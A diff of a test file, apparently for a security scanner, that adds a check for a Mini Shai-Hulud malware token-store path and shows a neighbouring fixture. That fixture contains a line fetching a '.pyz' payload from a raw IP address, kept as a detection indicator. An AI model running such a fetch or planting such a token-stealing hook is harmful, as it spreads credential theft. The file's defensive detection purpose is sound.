@@ -78,6 +78,16 @@ describe("hookRules", () => {
       expect(findings.some((f) => f.evidence === "com.user.gh-token-monitor.plist")).toBe(true);
     });
 
+    it("flags Mini Shai-Hulud gh-token-monitor token-store paths", () => {
+      const file: ConfigFile = {
+        path: ".config/gh-token-monitor/token",
+        type: "hook-script",
+        content: "ghp_redacted",
+      };
+      const findings = runAllHookRules(file);
+      expect(findings.some((f) => f.evidence === ".config/gh-token-monitor/token")).toBe(true);
+    });
+
     it("flags Python payload indicators from Mistral and Guardrails variants", () => {
       const file = makeHookCode(
         "process.env.MISTRAL_INIT = '1'; fetch('https://83.142.209.194/transformers.pyz')"
